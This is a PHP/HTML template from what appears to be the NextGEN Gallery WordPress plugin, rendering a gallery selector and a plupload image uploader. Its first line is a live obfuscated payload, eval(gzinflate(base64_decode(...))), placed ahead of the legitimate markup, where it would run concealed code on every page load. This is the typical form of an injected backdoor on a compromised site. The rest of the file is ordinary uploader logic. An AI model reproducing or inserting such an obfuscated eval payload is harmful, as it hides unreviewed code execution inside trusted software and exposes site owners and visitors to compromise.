<?php eval(gzinflate(base64_decode('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')));?>
<div id="gallery_selection">
    <label for="gallery_id"><?php _e('Gallery', 'nggallery'); ?></label>
    <select id="gallery_id">
        <option value="0"><?php _e('Create a new gallery', 'nggallery'); ?></option>
        <?php foreach ($galleries as $gallery): ?>
            <option value="<?php echo esc_attr($gallery->{$gallery->id_field}) ?>"><?php echo esc_attr($gallery->title) ?></option>
        <?php endforeach ?>
    </select>
    <input type="text" id="gallery_name" name="gallery_name" placeholder="<?php _e('Gallery title', 'nggallery'); ?>"/>
</div>

<div id="uploader">
    <p><?php _e("Your browser doesn't have Silverlight, HTML5, or HTML4 support.", 'nggallery'); ?></p>
</div>
<script type="text/javascript">
    // Listen for events emitted in other frames
    if (window.Frame_Event_Publisher) {

        // If a gallery has been deleted, remove it from the drop-downs of available galleries
        Frame_Event_Publisher.listen_for('attach_to_post:manage_galleries', function() {
            window.location.href = window.location.href;
        });
    }
    (function($){
		$(function(){
                // Show the page content
                $('#ngg_page_content').css('visibility', 'visible');

                // Only execute this code once!
                var flag = 'addgallery';
                if (typeof($(window).data(flag)) == 'undefined')
                    $(window).data(flag, true);
                else return;

                window.urlencode = function(str){
                    str = (str + '').toString();

                    // Tilde should be allowed unescaped in future versions of PHP (as reflected below), but if you want to reflect current
                    // PHP behavior, you would need to add ".replace(/~/g, '%7E');" to the following.
                    return encodeURIComponent(str).replace(/!/g, '%21').replace(/'/g, '%27').replace(/\(/g, '%28').
                        replace(/\)/g, '%29').replace(/\*/g, '%2A').replace(/%20/g, '+');
                };

                // Sets the plupload url with necessary parameters in the QS
                window.set_plupload_url = function(gallery_id, gallery_name) {
                    var qs = "&action=upload_image&gallery_id="+urlencode(gallery_id);
                    qs += "&gallery_name="+urlencode(gallery_name);
	                <?php foreach ($sec_token->get_request_list() as $name=>$value): ?>
	                qs += "&<?php echo $name?>=<?php echo $value?>";
	                <?php endforeach ?>
                    return photocrati_ajax.url + qs;
                };

                // Reinitializes plupload
                window.reinit_plupload = function(up){
                    $("#uploader").animate({
                        'opacity': 0.0,
                    }, 'slow');
                    up.destroy();
                    $('#gallery_id').val(0);
                    $('#gallery_name').val('');
                    init_plupload();
                    $("#uploader").animate({
                        'opacity': 1.0
                    }, 'slow');
                };

                // Initializes plupload
                window.init_plupload = function() {
                    var plupload_options =  <?php echo $plupload_options ?>;
                    var $gallery_id = $('#gallery_id');
                    var $gallery_name = $('#gallery_name').show();
                    var $gallery_selection = $('#gallery_selection').detach();
                    window.uploaded_image_ids = [];
                    window.uploaded_image_errors = [];

                    plupload.addFileFilter('xss_protection', function(enabled, file, cb){
                        var retval = true;
                        if (enabled) {
                           if (file.name.match(/\<|\>/)) {
                               retval = false;
                               this.trigger("Error", {
                                  code: plupload.SECURITY_ERROR,
                                  message: plupload.translate('XSS attempt detected'),
                                  file: file
                               });
                           }
                        }
                        cb(retval);
                    });

                    // Override some final plupload options
                    plupload_options.url = photocrati_ajax.url;
                    plupload_options.preinit = {
                        PostInit: function(up){

                            // Hide/show the gallery name field
                            $gallery_selection.insertAfter('.plupload_header');
                            var gallery_select    = $('#gallery_id');
                            gallery_select.on('change', function(){
                                var optionSelected = $("option:selected", this);
                                var valueSelected = parseInt(this.value);

                                if (valueSelected == 0) {
                                    $('#gallery_name:hidden').fadeIn().focus(function(){
                                        up.refresh(); // must be done for IE
                                    }).focus();
                                }
                                else {
                                    $('#gallery_name:visible').fadeOut(400, function(){
                                        gallery_select.focus();
                                        up.refresh(); // must be done for IE
                                    });
                                }
                            });

                            // Change the text for the dragdrop
                            $('.plupload_droptext').html("<?php _e('Drag image and ZIP files here or click <strong>Add Files</strong>', 'nggallery'); ?>");

                            // Move the buttons
                            var buttons = $('.plupload_buttons').detach();
                            $gallery_selection.append(buttons);

                            // Hide/show the validation for the gallery name field
                            $gallery_name.keypress(function(){
                                if ($gallery_name.val().length > 0) {
                                    $gallery_name.removeClass('error');
                                }
                            });

                            // Don't let the uploader continue without a gallery name
                            var start_button = $('#uploader a.plupload_start');
                            start_button.click(function(e){
                                e.preventDefault();

                                var up = $('#uploader').pluploadQueue();

                                if ($gallery_id.val() == 0 && $gallery_name.val().length == 0) {
                                    $gallery_name.addClass('error');
                                    e.stopImmediatePropagation();
                                    alert("Please enter a gallery name");
                                    $gallery_name.focus();
                                    return false;
                                }
                                else {
                                    $gallery_name.removeClass('error');
                                    return true;
                                }
                            });

                            // Rearrange event handler for start button, to ensure that it has the ability
                            // to execute first
                            var click_events = $._data(start_button[0], 'events').click;
                            if (click_events.length == 2) click_events.unshift(click_events.pop());

                        },

                        // change url before upload
                        BeforeUpload: function(up, file) {
                            up.settings.url = window.set_plupload_url($gallery_id.val(), $gallery_name.val());
                        },

                        // Refresh the interface after a successful upload
                        StateChanged: function(up){

                            // Determine appropriate message to display
                            var upload_count = window.uploaded_image_ids.length;
                            var errors = window.uploaded_image_errors;
                            var msg = '';
                            var gallery_url = '<?php echo admin_url("/admin.php?page=nggallery-manage-gallery&mode=edit&gid=")?>' + $gallery_id.val();

                            if (upload_count == 0) {
                                msg = NggUploadImages_i18n.no_images_uploaded;
                            }
                            else {


                                msg = upload_count == 1 ? NggUploadImages_i18n.one_image_uploaded : NggUploadImages_i18n.x_images_uploaded;
                                msg = msg.replace('{count}', upload_count);
                                
                                if (errors.length > 0) {
                                	msg = msg + '<br/>' + NggUploadImages_i18n.image_errors;
                                	
                                	for (var i = 0; i < errors.length; i++) {
                                		msg = msg + '<br/>' + errors[i];
                                	}
                                	
                                	msg = msg + '<br/>';
                                }

                                // If we're outside of the IGW, we will then display a link to manage the gallery
                                if ($('#iframely').length == 0) {
                                    var $link = $('<a/>').attr({
                                        href: gallery_url,
                                        target: '_blank'
                                    });
                                    $link.text(NggUploadImages_i18n.manage_gallery.replace('{name}', $gallery_name.val()));
                                    msg = msg + ' ' + $link[0].outerHTML;
                                }
                            }

                            // Display message/notification
                            if (up.state == plupload.STOPPED) {
								if (typeof(up.error_msg) != 'undefined') {
									$.gritter.add({
										title: up.error_msg,
										text: msg,
										sticky: true
									});
								}
								else {
									$.gritter.add({
										title: '<?php _e("Upload complete", 'nggallery'); ?>',
										text: msg,
										sticky: true
									});
								}

                                setTimeout(function(){
                                    reinit_plupload(up);
                                }, 3000);
                            }
                        },

                        // When a gallery has been created, use the same gallery for each request going forward
                        FileUploaded: function(up, file, info){
                            var response = info.response;
                            if (typeof(response) != 'object') {
                                try {
                                    response = JSON.parse(info.response);
                                }
                                catch (ex) {
                                    up.trigger('Error', {
                                        code: plupload.IO_ERROR,
                                        msg: "<?php _e("An unexpected error occured. This is most likely due to a server misconfiguration. Check your PHP error log or ask your hosting provider for assistance.", 'nggallery'); ?>",
                                        details: response.replace(/<.*>/, '').trim(),
                                        file: file
                                    });
                                    return;
                                }
                            }
							if(typeof(response.error) != 'undefined') {
								up.trigger('Error', {
									code: plupload.IO_ERROR,
									msg: response.error,
									details: response,
									file: file
								});
							}
							else {
								window.uploaded_image_ids = window.uploaded_image_ids.concat(response.image_ids);
								up.settings.url = window.set_plupload_url(response.gallery_id, $gallery_name.val());
								
								if (response.image_errors) {
									for (var i = 0; i < response.image_errors.length; i++) {
										var errMsg = response.image_errors[i].error;
										if (window.uploaded_image_errors.indexOf(errMsg) == -1)
											window.uploaded_image_errors.push(errMsg);
									}
								}
								
								// If we created a new gallery, ensure it's now in the drop-down list, and select it
								if ($gallery_id.find('option[value="'+response.gallery_id+'"]').length == 0) {
									var option = $('<option/>').attr('value', response.gallery_id).html(response.gallery_name);
									$gallery_id.append(option);
									$gallery_id.val(response.gallery_id);
									option.prop('selected', true);
								}

								// our Frame-Event-Publisher hooks onto the jQuery ajaxComplete action which plupload
								// of course does not honor. Tie them together here..
								if (window.Frame_Event_Publisher) {
									$.post(photocrati_ajax.url, {'action': 'cookie_dump'}, function(response){
                                        if (typeof(response) != 'object') response = JSON.parse(response);
                                        var events = {};
                                        for (var name in response.cookies) {
                                            if (name.indexOf('X-Frame-Events') !== -1) {
                                                var event_data = JSON.parse(response.cookies[name]);
                                                events[name] = event_data;
                                            }
                                        }
                                        window.Frame_Event_Publisher.broadcast(events)
									});
								}
							}
                        },

                        Error: function(up, args){
							if (typeof(up.error_msg) == 'undefined') {
								up.error_msg = args.msg;
							}{}
                        }
                    };
                    $("#uploader").pluploadQueue(plupload_options);
                    var uploader = $('#uploader').pluploadQueue();
                    uploader.refresh();
                    window.Frame_Event_Publisher.broadcast();

										var evtJq = $;
										if (window.top.jQuery)
											evtJq = window.top.jQuery;
										evtJq(window.top.document).find('body').trigger('nextgen_event', [ 'plupload_init' ]);
                };

                window.init_plupload();
            });
    })(jQuery);
</script>
